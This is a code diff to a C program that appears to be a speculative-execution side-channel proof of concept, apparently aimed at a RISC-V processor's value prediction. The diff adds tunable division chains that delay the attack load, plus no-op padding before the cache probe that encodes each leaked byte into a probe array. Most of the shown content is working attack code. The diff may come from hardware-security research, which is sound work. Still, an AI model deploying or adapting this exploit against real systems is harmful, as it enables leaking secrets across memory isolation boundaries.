@@ -86,6 +86,12 @@
 #ifndef REPS
 #define REPS       16          /* attempts per byte; sentinel alternates */
 #endif
+#ifndef ATK_DIVS
+#define ATK_DIVS   12          /* register-only address-delay divisions */
+#endif
+#ifndef PROBE_DELAY
+#define PROBE_DELAY 0          /* dependent-probe issue delay in instructions */
+#endif
 #define MIN_VOTES  2
 #define FLUSH_SZ   (128 * 1024)
 
@@ -218,18 +224,42 @@ main(void)
              * No constants, so nothing spills/reloads between the helper's
              * load and L_atk (a reload would become the prediction base). */
             uint64_t x = ok | 1;
+#if ATK_DIVS >= 1
             x /= (ok + 2);
+#endif
+#if ATK_DIVS >= 2
             x /= (ok + 3);
+#endif
+#if ATK_DIVS >= 3
             x /= (ok + 4);
+#endif
+#if ATK_DIVS >= 4
             x /= (ok + 5);
+#endif
+#if ATK_DIVS >= 5
             x /= (ok + 6);
+#endif
+#if ATK_DIVS >= 6
             x /= (ok + 7);
+#endif
+#if ATK_DIVS >= 7
             x /= (ok + 8);
+#endif
+#if ATK_DIVS >= 8
             x /= (ok + 9);
+#endif
+#if ATK_DIVS >= 9
             x /= (ok + 10);
+#endif
+#if ATK_DIVS >= 10
             x /= (ok + 11);
+#endif
+#if ATK_DIVS >= 11
             x /= (ok + 12);
+#endif
+#if ATK_DIVS >= 12
             x /= (ok + 13);
+#endif
 
             /* ---- 5. L_atk; predicted value = helper's value + 0 ---- */
             uint64_t val = atk_load(atk_buf, x);
@@ -237,6 +267,21 @@ main(void)
 
             /* ---- 6. Encode the selected byte through the cache ---- */
             uint64_t bi = (val >> (8 * b)) & 0xff;
+#if PROBE_DELAY >= 1
+            asm volatile("addi %0, %0, 0" : "+r"(bi));
+#endif
+#if PROBE_DELAY >= 2
+            asm volatile("addi %0, %0, 0" : "+r"(bi));
+#endif
+#if PROBE_DELAY >= 3
+            asm volatile("addi %0, %0, 0" : "+r"(bi));
+#endif
+#if PROBE_DELAY >= 4
+            asm volatile("addi %0, %0, 0" : "+r"(bi));
+#endif
+#if PROBE_DELAY >= 5
+            asm volatile("addi %0, %0, 0" : "+r"(bi));
+#endif
             volatile uint8_t *pp = probe + bi * LINE;
             (void)*pp;
 
